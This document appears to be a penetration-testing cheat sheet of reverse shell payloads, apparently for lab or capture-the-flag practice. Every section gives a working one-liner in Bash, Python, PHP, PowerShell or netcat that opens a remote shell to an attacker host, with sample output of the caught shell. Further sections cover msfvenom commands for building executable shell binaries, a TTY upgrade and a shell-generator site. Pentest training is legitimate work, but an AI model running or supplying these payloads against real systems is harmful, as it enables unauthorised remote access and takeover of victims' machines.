# REVERSE SHELLS & PAYLOADS

### Start listener

```bash
nc -nlvp 443
or: rlwrap nc -nlvp 443
```

> Always set up first

**Why:** Use port 443 (less likely filtered)

<details>
<summary>Example Output</summary>

```
nc -nlvp 443
Listening on 0.0.0.0 443

OR better:
rlwrap nc -nlvp 443
(rlwrap gives arrow key history in shell)
```
</details>

---

### Bash reverse shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

> Linux/Mac

**Why:** Most reliable on Linux

<details>
<summary>Example Output</summary>

```
bash -i >& /dev/tcp/10.10.14.2/443 0>&1

Attacker:
connect to [10.10.14.2] from [10.10.10.5] 48234
bash-4.4$ whoami
www-data
```
</details>

---

### Python reverse shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> If Python is installed

**Why:** Very common on Linux

<details>
<summary>Example Output</summary>

```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Attacker: $ whoami
www-data
```
</details>

---

### PHP reverse shell (one-liner)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> In command injection or upload

**Why:** Or use pentestmonkey full shell

<details>
<summary>Example Output</summary>

```
php -r '$sock=fsockopen("10.10.14.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'

OR in a web parameter:
cmd=php+-r+'$s=fsockopen("10.10.14.2",443);exec("/bin/sh+-i+<&3+>&3+2>&3");'

Attacker:
$ whoami
www-data
(Inline PHP shell, no file upload needed)
```
</details>

---

### PowerShell reverse shell

```bash
powershell -e <base64_payload>
Generate: msfvenom -p cmd/windows/reverse_powershell LHOST=ATTACKER_IP LPORT=443
```

> Windows targets

**Why:** Or use Nishang Invoke-PowerShellTcp

<details>
<summary>Example Output</summary>

```
powershell -e JABjAGwAaQBlAG4A...(base64)

Attacker:
connect from 10.10.10.5
PS C:\Users\admin> whoami
corp\admin
```
</details>

---

### nc reverse shell

```bash
nc -e /bin/sh ATTACKER_IP 443
or: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f
```

> Netcat

**Why:** Try both -e and mkfifo versions

<details>
<summary>Example Output</summary>

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 443 >/tmp/f

Attacker:
$ whoami
www-data
(Use this version when nc -e isn't available)
```
</details>

---

### msfvenom payloads

```bash
Windows: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
Linux: msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
```

> Generate binary payloads

**Why:** For upload + execute scenarios

<details>
<summary>Example Output</summary>

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o shell.exe

Payload size: 460 bytes
Saved as: shell.exe

Transfer to target, execute, catch with nc
```
</details>

---

### Upgrade to TTY shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

> After getting basic shell

**Why:** Full interactive shell

<details>
<summary>Example Output</summary>

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@target:/var/www$ ^Z
[1]+  Stopped
$ stty raw -echo; fg
www-data@target:/var/www$ export TERM=xterm
(Now have full interactive shell with tab complete)
```
</details>

---

### revshells.com

```bash
https://www.revshells.com/
```

> Generate any reverse shell

**Why:** Bookmark this

<details>
<summary>Example Output</summary>

```
Visit https://www.revshells.com/
Select: Bash -i, Python3, PHP, PowerShell #3
Enter: IP and Port
Copy generated payload
(Auto-generates reverse shells for any language)
```
</details>

---
